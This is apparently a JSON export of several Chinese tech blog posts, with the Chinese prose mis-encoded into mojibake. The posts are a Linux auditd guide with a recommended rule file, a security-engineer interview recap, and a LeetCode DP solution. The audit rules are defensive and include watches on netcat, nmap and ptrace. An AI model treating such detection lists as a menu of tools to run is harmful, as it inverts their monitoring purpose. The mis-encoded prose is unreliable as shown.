ï¼šè®°å½•æœ¬è¿›ç¨‹æ˜¯å¦å±äºæŸä¸ªå®‰å…¨ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚åœ¨AppArmorä¸­ï¼Œå¦‚æœå®šä¹‰äº†æœ¬è¿›ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œåˆ™å…¶å±æ€§ä¹Ÿå°†å¾—åˆ°è®°å½•ã€‚\nkey ï¼šå¦‚æœéœ€è¦å¯¹å¤§é‡çš„æ–‡ä»¶æˆ–ç›®å½•è¿›è¡Œç›‘æ§ï¼Œå¯ä»¥åœ¨è§„åˆ™ä¸­æ·»åŠ è¿™ä¸€å­—æ®µï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ ausearch ç­‰å·¥å…·æŸ¥æ‰¾ã€‚\nç¬¬äºŒæ¡æ—¥å¿—åˆ™å‘ˆç°äº† less å‘½ä»¤æ‰§è¡Œæ—¶çš„å·¥ä½œç›®å½•ä¿¡æ¯ï¼Œåˆ«æ— å…¶ä»–æ„ä¹‰ã€‚\nç¬¬ä¸‰æ¡æ—¥å¿—å‘ˆç°çš„ä¿¡æ¯è§£é‡Šå¦‚ä¸‹ï¼š\nitem ï¼šåœ¨æœ¬ä¾‹ä¸­ï¼Œ item å­—æ®µè¡¨ç¤º a0 å‚æ•°ï¼Œå³ SYSCALL æ¶ˆæ¯ä¸­è®°å½•çš„ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚å¦‚æœæŸä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ”¶äº†å¤šä¸ªè·¯å¾„å‚æ•°ï¼Œå°±ä¼šæœ‰æ›´å¤šçš„ PATH ç±»å‹çš„æ¶ˆæ¯äº§ç”Ÿã€‚ name ï¼šå‘ˆç°ä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“è·¯å¾„åç§°ã€‚ inode ï¼šè¡¨ç¤ºä¸ name ç›¸å…³çš„ inode ç¼–å·ã€‚ dev ï¼šæ–‡ä»¶å­˜å‚¨çš„å…·ä½“è®¾å¤‡ã€‚ mode ï¼šæ–‡ä»¶è®¿é—®æ§åˆ¶æƒé™çš„æ•°å­—è¡¨ç¤ºã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œrootç”¨æˆ·å…·æœ‰è¯»å†™çš„æƒé™ã€rootæ‰€åœ¨çš„ç”¨æˆ·ç»„å…·æœ‰è¯»å–æ–‡ä»¶çš„æƒé™ï¼Œè€Œå…¶ä½™çš„æ‰€æœ‰ç”¨æˆ·ï¼ˆç»„ï¼‰åˆ™å®Œå…¨ä¸å…·å¤‡æœ¬æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚ ouidã€ogid ï¼šæŒ‡å‘ç›¸å…³ inode çš„UIDå’ŒGIDã€‚ rdev ï¼šæœ¬ä¾‹ä¸­æ²¡æœ‰æ„ä¹‰ã€‚è¯¥å­—æ®µä»…é€‚ç”¨äºå—è®¾å¤‡æˆ–å­—ç¬¦è®¾å¤‡ï¼Œä¸æ–‡ä»¶æ— å…³ã€‚ æ—¥å¿—çš„æœç´¢ä¸åˆ†æ auditæ¡†æ¶æä¾›äº†ä¸€äº›æ—¥å¿—æŸ¥æ‰¾å·¥å…·ï¼Œä»¥ä¾¿æŸ¥çœ‹ç³»ç»Ÿä¸Šå‘ç”Ÿçš„ä¸€ç³»åˆ—äº‹ä»¶ã€‚\né€šè¿‡pid é€šè¿‡è¿›ç¨‹idæ¥æŸ¥çœ‹ç‰¹å®šäº‹ä»¶ï¼š\n# ausearch -p 1 è¯¥å‘½ä»¤å°†å‘ˆç°æ‰€æœ‰ä¸IDä¸º1çš„è¿›ç¨‹ç›¸å…³çš„äº‹ä»¶ã€‚\né€šè¿‡key é€šè¿‡ key æ¥ç®¡ç†äº‹ä»¶æ˜¯auditæ¡†æ¶ä¸­ä¸€ä¸ªå¾ˆæ£’çš„ç‰¹æ€§ï¼Œæ¨èæ—¥å¸¸ä½¿ç”¨ã€‚\nå¯ä»¥åœ¨è§„åˆ™ä¸­ä½¿ç”¨ -k é€‰é¡¹æ¥ä¸ºç›¸å…³äº‹ä»¶æ‰“ä¸Šæ ‡ç­¾ï¼Œæ–¹ä¾¿åç»­æŸ¥æ‰¾ï¼š\n# auditctl -w /etc/passwd -p rwxa -k KEY_pwd ç´§æ¥ç€ï¼ŒæŸ¥æ‰¾æ‰€æœ‰å¸¦æœ‰é”®å€¼ KEY_pwd çš„äº‹ä»¶ï¼Œausearchå°†å‘ˆç°æ‰€æœ‰ä¸æ–‡ä»¶ /etc/passwd ç›¸å…³çš„äº‹ä»¶ï¼š\n# ausearch -k KEY_pwd æŸ¥çœ‹å¼‚å¸¸äº‹ä»¶ æ–¹æ‰ä»‹ç»äº† ausearch çš„åŸºæœ¬ç”¨æ³•ï¼Œè€Œæ­¤å‰æåŠçš„ aureport å·¥å…·æ›´æ“…é•¿å¿«é€Ÿåœ°æŠ¥å‘Šç³»ç»Ÿä¸Šçš„å¼‚å¸¸äº‹ä»¶ï¼Œä¾‹å¦‚ï¼Œç½‘å¡å·¥ä½œåœ¨æ··æ‚æ¨¡å¼ã€è¿›ç¨‹æˆ–çº¿ç¨‹ç”±äºENOMEMç­‰é”™è¯¯å´©æºƒæ¨å‡ºç­‰ç­‰ã€‚\næœ€ç®€å•çš„æŸ¥çœ‹å¼‚å¸¸çš„å‘½ä»¤æ˜¯ï¼š\n# aureport -n ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤å·¥å…·ç”Ÿæˆè‡ªå®šä¹‰æŠ¥å‘Šï¼Œè¯¦è§ aureport æ–‡æ¡£ ã€‚\nå€¼å¾—è®°å½•çš„æ–‡ä»¶æˆ–ç³»ç»Ÿè°ƒç”¨ å§‹ç»ˆæ³¨æ„ï¼Œæ‰€æœ‰åˆ—å…¥å®¡è®¡çš„æ–‡ä»¶å’Œç³»ç»Ÿè°ƒç”¨éƒ½å°†äº§ç”Ÿæ—¥å¿—ï¼Œå› æ­¤è¦å¯¹æ—¥å¿—çš„æ•°é‡ä¿æŒè°¨æ…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸å®‰å…¨ç›¸å…³çš„äº‹ä»¶å’Œæ–‡ä»¶éƒ½éœ€è¦è¢«è®°å½•ï¼Œå¦‚IDSã€IPSã€anti-rootkitsç­‰ç­‰ï¼›ä¸æ­¤ç›¸å¯¹åœ°ï¼Œå¯¹äº write ç±»å‹çš„ç³»ç»Ÿè°ƒç”¨å°±æ²¡å¿…è¦è¿›è¡Œè®°å½•ï¼Œå¦åˆ™å³ä¾¿æ˜¯æœ€å¾®ä¸è¶³é“çš„å†™å…¥æ“ä½œéƒ½ä¼šè¢«è®°å½•åˆ°æ—¥å¿—ä¸­ã€‚\näººä»¬å¯ä»¥è®¾ç½®ä¸€ç³»åˆ—å¤æ‚çš„è§„åˆ™æ¥å®ç°å¯¹å®¡è®¡äº‹ä»¶çš„ç²¾ç»†ç®¡æ§ï¼Œè¯¦è§ auditctlæ–‡æ¡£ ã€‚\næœ¬æ–‡ä¸­ç»™å‡ºä¸¤ä»½å¯ç”¨åº¦è¾ƒé«˜çš„è§„åˆ™æ–‡ä»¶ [é™„ä»¶1](#é™„ä»¶1 æ¨èè§„åˆ™ï¼ˆ1ï¼‰) å’Œ [é™„ä»¶2](#é™„ä»¶2 æ¨èè§„åˆ™ï¼ˆ2ï¼‰) ï¼Œå¯ä»¥ç›´æ¥å°†å®ƒä»¬å¤åˆ¶åˆ° /etc/audit/audit.rules ä¸­ã€‚\nè¿œç¨‹æ—¥å¿—ä¼ è¾“ auditæ¡†æ¶æä¾›äº†ç”¨äºå®ç°æ—¥å¿—è½¬å‘çš„æ’ä»¶ï¼Œå¯ä»¥å°†æœ¬åœ°æ—¥å¿—è½¬å‘åˆ°è¿œç¨‹auditdä¸»æœºä¸Šã€‚\nå‘é€æ—¥å¿— å®ç°æ—¥å¿—çš„å‘é€ï¼Œéœ€è¦å…·å¤‡ audisp-remote æ’ä»¶ï¼Œè¯¥æ’ä»¶ç”±auditå®‰è£…åŒ…é»˜è®¤è‡ªå¸¦ã€‚é€šè¿‡ä¿®æ”¹å¦‚ä¸‹æ–‡ä»¶æ¥æ¿€æ´»æ’ä»¶ï¼š\n# æ–‡ä»¶ /etc/audisp/plugins.d/au-remote.conf --- active = yes direction = out path = /usr/bin/audisp-remote type = always format = string å¹¶åœ¨å¦‚ä¸‹æ–‡ä»¶ä¸­è®¾ç½®ç›®æ ‡ä¸»æœºï¼ˆå³æ—¥å¿—å‘é€çš„å¯¹è±¡ï¼‰ï¼š\n# æ–‡ä»¶ /etc/audisp/audisp-remote.conf --- remote_server = [domain_name | ip] port = 60 ## localport = optional transport = tcp æ¥æ”¶æ—¥å¿— æ¥å—æ—¥å¿—çš„é…ç½®è¾ƒä¸ºç®€å•ï¼š\n# æ–‡ä»¶ /etc/audit/auditd.conf --- tcp_listen_port = 60 tcp_listen_queue = 5 tcp_max_per_addr = 1 ## tcp_client_ports = 1024-65535 #optional tcp_client_max_idle = 0 å‚è€ƒèµ„æ–™ [1] Audit framework - ArchWiki (archlinux.org)\n[2] Understanding Linux Audit | Security Guide | SUSE Linux Enterprise Server 11 SP4\né™„ä»¶1 æ¨èè§„åˆ™ï¼ˆ1ï¼‰ # This file contains the auditctl rules that are loaded # whenever the audit daemon is started via the initscripts. # The rules are simply the parameters that would be passed # to auditctl. # First rule - delete all -D # Increase the buffers to survive stress events. # Make this bigger for busy systems -b 320 # Feel free to add below this line. See auditctl man page -w /etc/passwd -p wa -k passwd_changes -w /etc/selinux/ -p wa -k selinux_changes -w /sbin/insmod -p x -k module_insertion -w /etc/shadow -p wa -k shadow_changes -w /etc/sysconfig -p wa -k sysconfig_changes -w /etc/audit/audit.rules -p wa -k audit_rules_changes -w /etc/audit/auditd.conf -p wa -k audit_conf_changes -w /usr/sbin/vpnc -k vpnc_exec -p x -w /usr/bin/stunnel -k stunnel_exec -p x -w /usr/bin/nc -p x -k ncat_exec -w /usr/bin/nmap -p x -k nmap_exec -w /usr/bin/sudo -p x -k sudo_exec -w /usr/bin/su -p x -k su_exec -w /etc/group -p wa -k group_changes -w /var/log/wtmp -p w -k wtmp_changes -w /var/log/btmp -p w -k btmp_changes -w /usr/bin/getent -k getent_exec -p x -w /etc/rc.d/init.d -p wa -k initd_changes -w /etc/security/opasswd -p wa -k opasswd_changes -w /etc/gshadow -p wa -k gshadow_changes -w /etc/securetty -p wa -k securetty_changes -w /etc/login.defs -p wa -k login_defs_changes -w /etc/ld.so.conf -p wa -k ld_so_conf_changes -w /etc/sudoers -p wa -k sudoers_changes -w /etc/profile -p wa -k profile_changes -w /etc/hosts -p wa -k hosts_changes -w /etc/inittab -p wa -k inittab_changes -w /etc/sysconfig/iptables -p wa -k iptables_changes -w /etc/hosts.allow -p wa -k hosts_allow_changes -w /etc/hosts.deny -p wa -k hosts_deny_changes -w /root/.ssh/authorized_keys -p wa -k authorized_keys_changes -w /etc/crontab -p wa -k crontab_changes -w /etc/ssh/sshd_config -p wa -k sshd_config_changes -a always,exit -F arch=b32 -S ptrace -k process_inject -a always,exit -F arch=b64 -S ptrace -k process_inject -w /usr/bin/rdesktop -p x -k rdesktop_exec -w /etc/exports -p wa -k exports_changes -w /lib/modules/ -p wa -k lib_modules_changes -w /sbin/iptables-multi -p x -k iptables_exec -w /var/spool/cron/root -p wa -k spool_cron_root_changes -w /etc/resolv.conf -p wa -k resolv_conf_changes -a always,exit -S execve -k execve_event -a exit,always -S all -F euid=0 -F perm=awx -k root-commands é™„ä»¶2 æ¨èè§„åˆ™ï¼ˆ2ï¼‰ auditd/audit.rules at master Â· Neo23x0/auditd Â· GitHub\n","date":"2021-08-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/audit-%E7%AE%80%E8%BF%B0/","title":"audit ç®€è¿°"},{"content":"å®‰å…¨æ”»é˜²å·¥ç¨‹å¸ˆä¸€é¢ï¼Œå¤§æ¦‚ç‡æ˜¯å¯„äº†ï¼Œæ­¤å‰ä¹Ÿæ²¡æœ‰é‡åˆ°è¿‡è¿™ç§éš¾åº¦çš„é¢è¯•ï¼Œç¨ä½œè®°å½•å§ã€‚\næ¶æ„æ ·æœ¬çš„é™æ€åˆ†æï¼Ÿ\nå¤§è‡´ç­”äº†ä¸€äº›å¸¸è§çš„ï¼ŒPEæ–‡ä»¶å¤´çš„åˆ†æã€æ–‡ä»¶å“ˆå¸Œã€ç¬¦å·è¡¨ã€åç¼–è¯‘ä¹‹åçš„æ§åˆ¶æµå’Œæ•°æ®æµç­‰ã€‚\nå¦‚æœé’ˆå¯¹å†…å­˜é©»ç•™çš„æ¶æ„ç¨‹åºå‘¢ï¼Ÿ\næ˜¾ç„¶å°±æ˜¯ä¸Šä¸€ä¸ªé—®é¢˜çš„Plusç‰ˆæœ¬ã€‚æ²¡æœ‰æ€è·¯ã€‚é¢è¯•å®˜æé†’æˆ‘å¯ä»¥è€ƒè™‘å†…å­˜çš„R/W/Xå±æ€§ã€‚æˆ‘å°±è¯´å¯ä»¥æ£€æµ‹å¯æ‰§è¡Œçš„å†…å­˜æ®µï¼Œç„¶åæ ¹æ®è¿™äº›å†…å­˜æ®µçš„å†…å®¹å»ç”Ÿæˆå¯æ‰§è¡Œä»£ç çš„ç‰¹å¾ï¼Œé€å…¥æœºå™¨å­¦ä¹ æ¨¡å‹è¿›è¡Œæ£€æµ‹ã€‚æ‰¯å°±å®Œäº‹äº†â€¦â€¦\nä¸€ä¸ªè¿›ç¨‹ä¸­å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹ï¼ˆæ¯”å¦‚100ä¸ªï¼‰ï¼ŒCPUåªæœ‰4ä¸ªæ ¸ï¼Œæ€ä¹ˆåˆ†é…ï¼Ÿ\nå±äºæ˜¯å¤šçº¿ç¨‹çš„ä¸€ä¸ªå°ç›²åŒºï¼Œæˆ‘çŸ¥é“Pythonç”±äºGILå…¨å±€é”ï¼Œå¤šçº¿ç¨‹æ˜¯å‡çš„å¤šçº¿ç¨‹ï¼Œä¸çŸ¥é“å…¶ä»–è¯­è¨€çš„æƒ…å†µã€‚\ngitç†Ÿæ‚‰å—ï¼Ÿåˆ†æ”¯æ˜¯å¹²å•¥çš„ï¼Ÿ\nåªåœ¨æ—¥å¸¸åšå®¢ä¸­ç”¨gitï¼Œåˆ†æ”¯çŸ¥é“ä¸€ç‚¹ç‚¹ï¼Œå°±æ˜¯ä»ä¸»çº¿ä¸Šåˆ†å‡ºè‹¥å¹²ä¸ªåˆ†æ”¯ï¼Œå›¢é˜Ÿæˆå‘˜åœ¨ä¸Šé¢å¼€å‘ï¼Œä¸å½±å“ä¸»çº¿ç‰ˆæœ¬ï¼Œæœ€åå†åˆå¹¶èµ·æ¥ã€‚\nå¤šçº¿ç¨‹æ‰«æçš„æ—¶å€™ï¼Œæµé‡å¯èƒ½å¾ˆå¤§ï¼Œæ€ä¹ˆè¿›è¡Œæ§åˆ¶ï¼Œæ€ä¹ˆèƒ½ä¸æŠŠç›®æ ‡æ‰«å´©ï¼ˆæ‰«æä¸èƒ½äº§ç”ŸDoSçš„æ•ˆæœï¼‰ï¼Ÿ\næˆ‘æŠŠè¿™ä¸ªé—®é¢˜æç‚¼æˆå¹¶å‘æµé‡çš„æ§åˆ¶ï¼Œè¿›ä¸€æ­¥å°±æ˜¯å¹¶å‘çº¿ç¨‹çš„æ§åˆ¶ã€‚åªè¦æ§åˆ¶æ´»è·ƒçš„çº¿ç¨‹æ•°é‡ï¼Œå°±èƒ½è¾¾åˆ°æ§åˆ¶æµé‡çš„ä½œç”¨ã€‚\n5.1. é‚£æ€ä¹ˆæ§åˆ¶çº¿ç¨‹çš„æ•°é‡ï¼Ÿ\nå¯èƒ½å¯ä»¥å…ˆèµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œä»¥è¿™ä¸ªçº¿ç¨‹çš„æµé‡ä¸ºæ ‡å‡†ï¼Œæ ¹æ®æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼æ¥å¾—å‡ºçº¿ç¨‹çš„æœ€å¤§æ´»è·ƒæ•°é‡ã€‚\n5.2. ä½†æ˜¯åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œä½ åˆ°è¾¾ç›®æ ‡çš„æµé‡å¯èƒ½è·Ÿä½ å‡ºå£çš„æµé‡ç›¸å·®å¾ˆå¤šï¼Œå› ä¸ºä½ çš„æµé‡è¦åˆ°è¾¾ç›®æ ‡ï¼Œè¿˜è¦è¿‡å…¬ç½‘ç¯å¢ƒï¼Ÿ\nä½†æ˜¯æˆ‘ä»¬åªèƒ½æ§åˆ¶å’Œè®¡ç®—å‡ºå£æµé‡ï¼Œæ‰€ä»¥åªèƒ½ä»¥å‡ºå£æµé‡ä¸ºæ ‡å‡†å•Šã€‚è€ƒè™‘å…¬ç½‘ç¯å¢ƒçš„æŸå¤±çš„è¯ï¼Œå¯èƒ½å¯ä»¥æŒ‰ç…§å‡ºå£æµé‡çš„è®¡ç®—å€¼ï¼Œå†ç¨å¾®ä¸Šè°ƒä¸€äº›ï¼Œä½œä¸ºé˜ˆå€¼ã€‚\nå†…å¿ƒOSï¼šçæ‰¯å°±å®Œäº†ã€‚åæ¥é¢è¯•å®˜å»ºè®®å¯ä»¥å»çœ‹çœ‹nmapçš„æµé‡æ§åˆ¶ï¼Œè¿™ä¸€ç‚¹æ‰“ç®—ä»¥åæœ‰ç©ºå†™ä¸ªåšå®¢ã€‚\nå¤šä¸ªæ¨¡å—ä¹‹é—´çš„è§£è€¦ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š\næœ‰å››ä¸ªæ¨¡å—åˆ†åˆ«æ˜¯ï¼šã€ç«¯å£å‘ç°ã€‘ã€ã€æœåŠ¡è¯†åˆ«ã€‘ã€ã€Webæ¨¡ç³Šæµ‹è¯•ã€‘ã€ã€POCæµ‹è¯•ã€‘ï¼Œæ¨¡å—ä¹‹é—´ç›¸äº’ä½œç”¨ï¼Œä¸»ç¨‹åºå¦‚ä½•å°†ä»–ä»¬è”ç³»èµ·æ¥ï¼Ÿ\nè¿™é¢˜ç»™æˆ‘é—®æ‡µäº†ï¼Œå¼€å§‹çæ‰¯ã€‚\né¦–å…ˆåˆ†æï¼Œè¿™å››ä¸ªæ¨¡å—åº”è¯¥æ˜¯ä¸²è”çš„å…³ç³»ï¼Œå³æœåŠ¡è¯†åˆ«æ¨¡å—ä¾èµ–ç«¯å£å‘ç°çš„è¾“å‡ºï¼Œè¿™æ ·å°±å¯ä»¥ç”¨ç”Ÿäº§è€…æ¶ˆè´¹è€…çš„æ¨¡å‹æ¥æŠŠä»–ä»¬ç»„ç»‡èµ·æ¥ã€‚ç”±äºæˆ‘ä»¬å¹¶ä¸éœ€è¦å‰ä¸€ä¸ªæ¨¡å—çš„å®Œæ•´è¾“å‡ºï¼Œåªéœ€è¦å‰ä¸€ä¸ªæ¨¡å—äº§ç”Ÿéƒ¨åˆ†è¾“å‡ºï¼Œåä¸€ä¸ªæ¨¡å—å°±å¯ä»¥å¼€å§‹å·¥ä½œäº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æµæ°´çº¿çš„æ€è·¯æ¥ç»„ç»‡ã€‚\nè¿›ä¸€æ­¥å¼€å§‹æ‰¯IOCï¼Œé€†è½¬æ§åˆ¶ï¼Œå°±æ˜¯åŸæœ¬æ˜¯ä¸€ä¸ªæ¨¡å—æ¥å®ä¾‹åŒ–å¦ä¸€ä¸ªæ¨¡å—ï¼Œä½†æ˜¯è¿™æ ·ä»–ä»¬å°±è€¦åˆåœ¨ä¸€èµ·äº†ï¼ŒIOCå°±æ˜¯å¼•å…¥ä¸€ä¸ªç¬¬ä¸‰æ–¹æ§åˆ¶ç¨‹åºï¼Œç”±å®ƒæ¥è®²å¦ä¸€ä¸ªæ¨¡å—çš„å¯¹è±¡åœ¨åˆé€‚çš„æ—¶æœºæ³¨å…¥åˆ°æ¨¡å—ä¸­ï¼Œå„ä¸ªæ¨¡å—å°±ä¸éœ€è¦åœ¨è‡ªå·±çš„ä»£ç ä¸­å¼•ç”¨å…¶ä»–æ¨¡å—äº†ã€‚\nç„¶åæ‰¯åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¯èƒ½ä¸Šä¸€ä¸ªæ¨¡å—äº§ç”Ÿè¾“å‡ºä¹‹åï¼Œå°±å¯ä»¥æŒ‚åˆ°ä¸‹ä¸€ä¸ªæ¨¡å—çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸Šï¼Œå”¤é†’ä¸‹ä¸€ä¸ªæ¨¡å—æ¥å¼€å§‹å·¥ä½œã€‚\nç„¶è€Œæ¶ˆæ¯é˜Ÿåˆ—çš„å…·ä½“å®ç°å¹¶ä¸äº†è§£ï¼Œå°±æ²¡æœ‰å¤šè®²ã€‚\nèŠäº†èŠå…¶ä»–é¡¹ç›®ï¼Œè¿˜æœ‰å•¥é—®é¢˜æ²¡ï¼Œoverã€‚\næ€»ä½“æ¥è¯´ï¼Œæ•´ä¸ªé¢è¯•çš„æŠ€æœ¯å†…å®¹è¿˜æ˜¯æ¯”è¾ƒç¡¬æ ¸ï¼Œç¡®å®èƒ½å¤Ÿèµ·åˆ°ç­›é€‰äººçš„ä½œç”¨ã€‚å¾ˆå¤šé—®é¢˜ä¸ä¸€å®šè¦ä½ ä¼šç»†èŠ‚ï¼Œè„‘æ´å¤Ÿå¤§å°±è¡Œï¼›åŒæ—¶ï¼Œä½ åœ¨å®‰å…¨é¢†åŸŸçš„è§è¯†å¤Ÿä¸å¤Ÿä¸°å¯Œï¼Œä¹Ÿæ˜¯èƒ½é—®å‡ºæ¥çš„ã€‚\næˆ‘ä¸ªäººçš„èƒ½åŠ›ç¡®å®æ²¡æœ‰éå¸¸ç²¾çš„é¢†åŸŸï¼ˆæ¯•ç«Ÿæœ¬ç§‘æ˜¯é€šè¯†æ•™è‚²å•Šæ“ï¼‰ï¼Œå¤§æ¦‚ç‡æ˜¯å‡‰äº†ã€‚\nä½†æ˜¯ç›¸æ¯”ä¹‹ä¸‹ï¼Œæ­¤å‰å­—èŠ‚ä¸€é¢äºŒé¢çš„é—®é¢˜å…¨æ˜¯å…«è‚¡ï¼Œä¸‡å¹´ä¸å˜çš„é‚£ç§ï¼Œå®Œäº‹ä¹‹åæ’•ä»£ç ï¼Œç­›äººå…¨é ç®—æ³•ï¼Œç®€ç›´æ— è¯­ã€‚è¢«è¿™ç§é¢è¯•æŒ‚äº†ï¼Œæ€»æ¯”è¢«ç®—æ³•æŒ‚äº†æ¥å¾—æœæ°”ï¼Œæ•´åœºä½“éªŒèƒ½ç»™ä¸ª3.5åˆ†å§ã€‚\n","date":"2021-08-21T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E9%9D%A2%E7%BB%8F-%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%B7%A5%E7%A8%8B%E5%B8%88/","title":"æ·±ä¿¡æœé¢ç»-å®‰å…¨æ”»é˜²å·¥ç¨‹å¸ˆ"},{"content":"é¢˜ç›® ç»™ä½ ä¸€ä¸ªæ•°ç»„ target ï¼ŒåŒ…å«è‹¥å¹² äº’ä¸ç›¸åŒ çš„æ•´æ•°ï¼Œä»¥åŠå¦ä¸€ä¸ªæ•´æ•°æ•°ç»„ arr ï¼Œarr å¯èƒ½ åŒ…å«é‡å¤å…ƒç´ ã€‚\næ¯ä¸€æ¬¡æ“ä½œä¸­ï¼Œä½ å¯ä»¥åœ¨ arr çš„ä»»æ„ä½ç½®æ’å…¥ä»»ä¸€æ•´æ•°ã€‚æ¯”æ–¹è¯´ï¼Œå¦‚æœ arr = [1,4,1,2] ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨ä¸­é—´æ·»åŠ  3 å¾—åˆ° [1,4,3,1,2] ã€‚ä½ å¯ä»¥åœ¨æ•°ç»„æœ€å¼€å§‹æˆ–æœ€åé¢æ·»åŠ æ•´æ•°ã€‚\nè¯·ä½ è¿”å› æœ€å°‘ æ“ä½œæ¬¡æ•°ï¼Œä½¿å¾— target æˆä¸º arr çš„ä¸€ä¸ªå­åºåˆ—ã€‚\nä¸€ä¸ªæ•°ç»„çš„ å­åºåˆ— æŒ‡çš„æ˜¯åˆ é™¤åŸæ•°ç»„çš„æŸäº›å…ƒç´ ï¼ˆå¯èƒ½ä¸€ä¸ªå…ƒç´ éƒ½ä¸åˆ é™¤ï¼‰ï¼ŒåŒæ—¶ä¸æ”¹å˜å…¶ä½™å…ƒç´ çš„ç›¸å¯¹é¡ºåºå¾—åˆ°çš„æ•°ç»„ã€‚æ¯”æ–¹è¯´ï¼Œ[2,7,4] æ˜¯ [4,2,3,7,2,1,4] çš„å­åºåˆ—ï¼ˆåŠ ç²—å…ƒç´ ï¼‰ï¼Œä½† [2,4,2] ä¸æ˜¯å­åºåˆ—ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š target = [5,1,3], arr = [9,4,2,3,4] è¾“å‡ºï¼š 2 è§£é‡Šï¼š ä½ å¯ä»¥æ·»åŠ  5 å’Œ 1 ï¼Œä½¿å¾— arr å˜ä¸º [5,9,4,1,2,3,4] ï¼Œtarget ä¸º arr çš„å­åºåˆ—ã€‚ ç¤ºä¾‹2\nè¾“å…¥ï¼š target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1] è¾“å‡ºï¼š 3 æ•°æ®èŒƒå›´\n1 \u0026lt;= target.length, arr.length \u0026lt;= 10^5 1 \u0026lt;= target[i], arr[i] \u0026lt;= 10^9 target ä¸åŒ…å«ä»»ä½•é‡å¤å…ƒç´ ã€‚ åˆ†æ 1 ç›´è§‚è§£æ³• é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥éå¸¸ç›´æ¥åœ°æƒ³åˆ°ä¸¤ä¸ªæ•°ç»„çš„ æœ€é•¿å…¬å…±å­åºåˆ— çš„é—®é¢˜ã€‚\næˆ‘ä»¬æ±‚å‡º target å’Œ arr çš„æœ€é•¿å…¬å…±å­åºåˆ—ï¼Œç„¶ååœ¨ arr ä¸­ï¼Œå¯¹è¿™ä¸ªåºåˆ—è¿›è¡Œå…ƒç´ çš„å¢æ·»ï¼Œå³å¯ä½¿å¾— target å˜æˆ arr çš„å­åºåˆ—ã€‚äºæ˜¯ç­”æ¡ˆåº”è¯¥æ˜¯ï¼š target.size() - LongestCommonSequence.size() ã€‚\nç„¶è€Œï¼Œæœ€é•¿å…¬å…±å­åºåˆ—æ‰€éœ€çš„DPï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n^2) ï¼Œæ ¹æ®é¢˜ç›®çš„æ•°æ®èŒƒå›´ï¼Œä¼šè¶…æ—¶ã€‚\nç»™å‡ºè¶…æ—¶ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡ 73/82 ä¸ªç”¨ä¾‹ã€‚\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { // dp[a][b] target ä»aå¼€å§‹,arrä»bå¼€å§‹ å¾—åˆ°çš„æœ€é•¿å­åºåˆ— // target[a] == arr[b],åˆ™ dp[a][b] = dp[a - 1][b - 1] + 1 // target[a] != arr[b]ã€‚åˆ™ dp[a][b] = max(dp[a][b - 1], dp[a - 1][b], dp[a - 1][b - 1]) vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; dp(target.size() + 1, vector\u0026lt;int\u0026gt;(arr.size() + 1, 0)); for (int a = 0; a \u0026lt; target.size(); a++) { for (int b = 0; b \u0026lt; arr.size(); b++) { if (target[a] == arr[b]) { dp[a][b] = (a == 0 || b == 0) ? 1 : dp[a - 1][b - 1] + 1; } else { if (a != 0 \u0026amp;\u0026amp; b != 0) { dp[a][b] = max( max(dp[a][b - 1], dp[a - 1][b]), dp[a - 1][b - 1] ); } else if (a == 0 \u0026amp;\u0026amp; b == 0) { dp[a][b] = 0; } else if (a == 0) { dp[a][b] = dp[a][b - 1]; } else { dp[a][b] = dp[a - 1][b]; } } } } return target.size() - dp[target.size() - 1][arr.size() - 1]; } }; 2 é—®é¢˜è½¬åŒ– åœ¨æœ€é•¿å…¬å…±å­åºåˆ—è¶…æ—¶ä¹‹åï¼Œå°±æƒ³ä¸åˆ°å…¶ä»–çš„è§£æ³•äº†â€¦â€¦\nç¿»é˜…é¢˜è§£å‘ç°ï¼Œæ­¤å‰å°‘è€ƒè™‘äº†ä¸€ä¸ªæ¡ä»¶ï¼štarget æ•°ç»„ä¸­çš„å…ƒç´  äº’ä¸ç›¸åŒ ã€‚\nè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿæˆ‘ä»¬ä¼¼ä¹å¯ä»¥ç”¨æŸç§æ˜ å°„æ¥å¤„ç† target æ•°ç»„ä¸­çš„å…ƒç´ å•Šã€‚\næˆ‘ä»¬å‘ç°ï¼Œåœ¨ arr æ•°ç»„ä¸­ï¼Œå¯ä»¥ç”¨ ä¸‹æ ‡ æ¥ä»£è¡¨ target æ•°ç»„ä¸­çš„å…ƒç´ ã€‚\nä¾‹å¦‚é¢˜ç›®ç»™å‡ºçš„ç¤ºä¾‹2ï¼Œ target = [6,4,8,1,3,2] ï¼Œ arr = [4,7,6,2,3,8,6,1] ã€‚é‚£ä¹ˆå¯¹äºæ—¢å‡ºç°åœ¨ target æ•°ç»„ä¸­ã€åˆå‡ºç°åœ¨ arr æ•°ç»„ä¸­çš„å…ƒç´  6,4,8,1,3,2 